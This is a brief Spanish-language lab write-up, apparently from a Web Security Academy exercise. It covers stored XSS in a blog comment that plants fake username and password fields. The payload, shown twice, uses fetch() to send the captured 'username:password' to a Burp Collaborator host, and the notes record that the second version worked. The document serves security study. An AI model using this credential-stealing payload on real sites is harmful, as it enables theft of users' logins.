![[Pasted image 20220831203059.png]]


hago click en un post y al poner un comentario uso el payload:

%input name=username id=username>
%input type=password name=password onchange="if(this.value.length)fetch('https://7fnshjgz6go37glsv7ksq8dqrhx7lw.burpcollaborator.net', {
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

![[Pasted image 20220831205053.png]]

click en back to blog

![[Pasted image 20220831203803.png]]

pero no funciono, intentando con el payload oficial de la academia:

%input name=username id=username%
%input type=password name=password onchange="if(this.value.length)fetch('https://b8kgtl376yt26mk8dmwhp6w4qvwlka.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"%

![[Pasted image 20220901201108.png]]


![[Pasted image 20220901201203.png]]

click en back to blog y pongo a poll now en el collaborator client: de hecho ni hubo necesidad de dar clcik, el solo genero las trazas:

![[Pasted image 20220901201430.png]]


![[Pasted image 20220901201535.png]]


![[Pasted image 20220901201559.png]]



